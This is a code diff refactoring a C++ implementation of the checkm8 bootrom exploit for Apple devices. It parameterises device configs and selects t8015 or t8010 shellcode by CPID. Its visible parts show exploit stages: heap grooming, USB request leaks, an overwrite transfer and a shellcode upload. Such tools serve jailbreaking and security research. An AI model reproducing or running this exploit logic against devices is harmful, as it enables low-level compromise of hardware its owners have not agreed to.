@@ -602,20 +602,17 @@ typedef struct alignas(1)
   uint32_t End = 0xbeefbeef;
 } t8015_overwrite;
 
-void checkm8()
+void checkm8(DeviceConfig config)
 {
-  // Create device config
-  // t8010_overwrite Overwrite;
-  t8015_overwrite Overwrite;
-  // assert(sizeof(t8010_overwrite) == 1524);
-
-  // DeviceConfig DC_t8010("iBoot-2696.0.0.1.33", 0x8010, 0, (uint8_t *)&Overwrite,
-  //                       sizeof(Overwrite), 5, 1);
-  DeviceConfig DC_t8015("iBoot-3332.0.0.1.23", 0x8015, 0, (uint8_t *)&Overwrite,
-                        sizeof(Overwrite), 6, 1);
-
+  vector<uint8_t> Shellcode;
   // Get shellcode
-  auto Shellcode = getT8015Shellcode();
+  if (config.cpid == 0x8015) {
+    Shellcode = getT8015Shellcode();
+  } else {
+    Shellcode = getT8010Shellcode();
+  } 
+
+  assert(&Shellcode != NULL);
 
   // Run exploit (t8010 specific)
   DFU D;
@@ -634,7 +631,7 @@ void checkm8()
   printf("[*] stage 1, heap grooming ...\n");
 
   D.stall();
-  for (int i = 0; i < DC_t8015.hole; i++)
+  for (int i = 0; i < config.hole; i++)
   {
     D.no_leak();
   }
@@ -659,12 +656,12 @@ void checkm8()
   D.acquire_device();
   D.usb_req_stall();
 
-  for (int i = 0; i < DC_t8015.leak; i++)
+  for (int i = 0; i < config.leak; i++)
   {
     D.usb_req_leak();
   }
-  D.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, DC_t8015.overwrite,
-                                   DC_t8015.overwrite_size, 100);
+  D.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, config.overwrite,
+                                   config.overwrite_size, 100);
 
   for (int i = 0; i < Shellcode.size(); i += 0x800)
   {
@@ -803,8 +800,20 @@ void runCheckm8()
       serial.find("CPID:8000 CPRV:20") != string::npos ||
       serial.find("CPID:8003 CPRV:01") != string::npos)
     checkm8_A8_A9();
-  else
-    checkm8();
+  else {
+    if (serial.find("CPID:8015") != string::npos) {
+      // Create device config
+      t8015_overwrite Overwrite;
+      checkm8(DeviceConfig("iBoot-3332.0.0.1.23", 0x8015, 0, (uint8_t *)&Overwrite,
+                        sizeof(Overwrite), 6, 1));
+    } else if (serial.find("CPID:8010") != string::npos) {
+      // Create device config
+      t8010_overwrite Overwrite;
+      checkm8(DeviceConfig("iBoot-2696.0.0.1.33", 0x8010, 0, (uint8_t *)&Overwrite,
+                        sizeof(Overwrite), 5, 1));
+    }
+
+  }
 }
 
 void demoteDevice()
